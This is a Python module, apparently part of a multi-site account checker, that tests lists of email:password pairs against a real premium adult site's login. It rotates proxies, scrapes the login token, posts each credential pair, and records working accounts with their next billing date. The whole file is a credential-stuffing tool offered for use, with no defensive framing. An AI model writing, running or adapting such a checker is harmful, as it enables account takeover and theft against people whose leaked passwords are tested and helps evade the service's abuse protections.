from modules.variables import Checker
from modules.functions import return_proxy, set_proxy, log, save, bad_proxy
from requests import Session
from requests.adapters import HTTPAdapter, Retry
from urllib.parse import quote
import functools

def check(email:str,password:str):
    while not Checker.stopping:   
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)

            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded",
                    "Host": "www.pornhubpremium.com" ,
                    "Origin": "https://www.pornhubpremium.com" ,
                    "Referer": "https://www.pornhubpremium.com/premium/login" ,
                    "sec-ch-ua": "\"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"" ,
                    "sec-ch-ua-mobile": "?0" ,
                    "Sec-Fetch-Dest": "empty" ,
                    "Sec-Fetch-Mode": "cors" ,
                    "Sec-Fetch-Site": "same-origin" ,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36" ,
                    "X-Requested-With": "XMLHttpRequest"
                }
                data = "username={}&password={}&token={}&redirect=&from=pc_premium_login&segment=straight"
                token = s.get("https://www.pornhubpremium.com/premium/login").text.split("<input type=\"hidden\" name=\"token\" id=\"token\" value=\"")[1].split("\" />")[0]
                response = s.post("https://www.pornhubpremium.com/front/authenticate",headers=headers,data=data.format(email,quote(password),token)).text
                if "success\":\"0\",\"" in response:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "success\":\"1\",\"" in response:
                    plan = s.get("https://www.pornhubpremium.com/user/manage/start").text
                    if "Next Billing Date" in plan:
                        expiry = plan.split("p id=\"expiryDatePremium\">Next Billing Date ")[1].split("</date></p>")[0]
                        if not Checker.cui: log("good",":".join([email,password])+f" | Expire: {expiry}","Pornhub")
                        save("Pornhub","good",Checker.time,":".join([email,password])+f" | Expire: {expiry}")
                        Checker.good += 1
                        return_proxy(proxy)
                        return
                    else:
                        if not Checker.cui: log("custom",":".join([email,password]),"Pornhub")
                        save("Pornhub","custom",Checker.time,":".join([email,password]))
                        Checker.custom += 1
                        return_proxy(proxy)
                        return
                else:
                    raise
        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
        
        